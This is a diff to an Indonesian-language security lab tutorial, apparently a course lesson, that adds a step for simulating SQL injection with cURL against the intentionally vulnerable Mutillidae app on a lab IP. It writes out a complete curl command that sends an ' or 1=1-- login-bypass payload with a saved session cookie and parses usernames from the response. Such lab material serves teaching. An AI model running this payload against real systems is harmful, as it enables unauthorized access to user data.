@@ -61,8 +61,14 @@ Lesson 7 - SQL Injection, Burpsuite, cURL, Perl Parser
  
  #### # Simulate CURL SQL Injection: (Method #2)
  - **Step 1** : Copy cookies PHPSESSID pada header request pada Burp Suite Bagian SQL Injection: Obtain Userlist (Method #1) **Step 6** dan simpan pada file crack_cookies.txt
+ ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_17_49_09.png)
+ - **Step 2** : Jalankan perintah
  
- - **Step 2** : 
+ `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.64/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'`
+ 
+ - **Step 3** : Setelah menjalankan perintah, hasil dari curl sql injection dapat dilihat pada terminal.
+ 
+ 
  
  
  
